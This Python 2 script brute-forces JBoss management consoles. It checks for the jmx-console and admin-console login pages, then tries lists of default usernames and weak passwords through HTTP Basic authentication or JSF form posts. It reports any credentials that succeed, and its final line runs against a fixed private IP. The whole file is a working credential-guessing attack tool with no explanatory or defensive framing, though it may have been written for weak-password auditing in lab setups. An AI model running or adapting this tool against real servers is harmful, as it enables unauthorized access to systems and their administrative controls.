import requests
import re
import urllib
import base64
import threading
import Queue
import time

weak_passwd = []
queue = Queue.Queue()

class ThreadUrl(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            domain = self.queue.get()
            if not domain.endswith('/'):
                domain = domain + '/'
            url = []
            webpath = ['jmx-console','admin-console/login.seam']
            flag_list = [
                '>jboss.j2ee</a>',
                'JBoss JMX Management Console',
                'HtmlAdaptor?action=displayMBeans',
                '<title>JBoss Management']
            user_list = ['admin', 'jboss', 'manager', 'root', 'guest', ]
            PASSWORD_DIC = [
                'admin',
                # 'vulhub',
                'root',
                'password',
                'jboss',
                'manager',
                '1qaz@WSX',
                '123456',
                'admin123',
                'admin123456',
                '1qaz2wsx',
                '1q2w3e4r',
                'admin888',
                'guest',
                '1q2w3e',
                'admin12345678',
                'p@ssw0rd',
                '123qwe!@#$',
                '123qwe!@#',
                'abc123',
                'abc123456',
                'root#123',
                'administrator',
            ]
            for path in webpath:
                login_ = domain + path
                requst = requests.get(login_,timeout=3,verify=False)
                if re.findall(
                        'name="javax.faces.[a-zA-z]+" id="',
                        requst.content,re.S):
                    url.append(path)
                if re.findall(
                        'This request requires HTTP authentication',requst.content,re.S):
                    url.append(path)
            for login in url:
                print "[+] The accessible blasting interfaces are {}".format(login)
            if url[0] == webpath[0]:
                login_url = domain + webpath[0]
                for user in user_list:
                    for password in PASSWORD_DIC:
                        auth_str_temp = user + ':' + password
                        auth_str = base64.b64encode(auth_str_temp)
                        headers = {
                            "Authorization": 'Basic' + " " + auth_str
                        }
                        # proxies = {"http": "http://127.0.0.1:8082", }
                        result = requests.get(login_url, timeout=3.5, headers=headers,verify=False)
                        for flag in flag_list:
                            if flag in result.text:
                                weak_passwd.append(auth_str_temp)
                                break
            else:
                login_url = domain + webpath[1]
                for user in user_list:
                    for password in PASSWORD_DIC:
                        s = requests.session()
                        response = s.get(login_url,timeout=3.5)
                        javalue = re.findall(r'name="javax.faces.ViewState" id="javax.faces.ViewState" value="(.*?)"', response .content)
                        key_hash = urllib.quote(javalue[0])
                        post = "login_form=login_form&login_form:name=%s&login_form:password=%s&login_form:submit=Login&javax.faces.ViewState=%s" % (
                            user, password, key_hash)
                        headers = {'Content-Type':'application/x-www-form-urlencoded'}
                        result = s.post(login_url,data=post,timeout=5,headers=headers)
                        if r"Welcome {}".format(user) in result.content:
                            auth = user + ":" + password
                            weak_passwd.append(auth)
                            break
            self.queue.task_done()


def check(domain):
    time_start = time.time()
    for i in range(5):
        t = ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
    queue.put(domain)
    queue.join()
    time_end = time.time()
    # print time_end - time_start
    print "[+] Get account password " + str(weak_passwd)


check('http://192.168.1.51:8080/')